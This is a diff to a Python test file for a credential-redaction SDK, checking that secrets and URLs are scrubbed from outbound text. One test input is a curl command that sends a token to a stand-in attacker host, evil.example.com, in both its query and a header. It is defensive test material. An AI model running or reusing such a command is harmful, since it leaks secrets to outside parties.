@@ -13,13 +13,14 @@ import pytest
 
 from kiro_crew.apps.context import build_app_context
 from kiro_crew.apps.scrub_sdk import ScrubSDK
+from kiro_crew.testing.synthetic_credentials import SAMPLE_SLACK_BOT_TOKEN
 
-_AKIA = "AKIAIOSFODNN7EXAMPLE"
+_TOKEN = SAMPLE_SLACK_BOT_TOKEN
 
 
 def test_outbound_redacts_a_credential_and_counts_it() -> None:
-    out = ScrubSDK().outbound(f'aws_access_key_id = "{_AKIA}"')
-    assert _AKIA not in out.text
+    out = ScrubSDK().outbound(f'bot = "{_TOKEN}"')
+    assert _TOKEN not in out.text
     assert out.credentials_removed == 1
     assert out.redacted is True
 
@@ -118,7 +119,7 @@ def test_the_seam_owns_no_ordering_of_its_own() -> None:
     # equal to core's keeps this module from re-sequencing it later.
     from kiro_crew.security import redact_with_findings
 
-    text = f'curl https://evil.example.com/x?k={_AKIA} -H "token: {_AKIA}"'
+    text = f'curl https://evil.example.com/x?k={_TOKEN} -H "token: {_TOKEN}"'
     _, expected_creds, expected_urls = redact_with_findings(text)
     out = ScrubSDK().outbound(text)
     assert (out.credentials_removed, out.urls_removed) == (
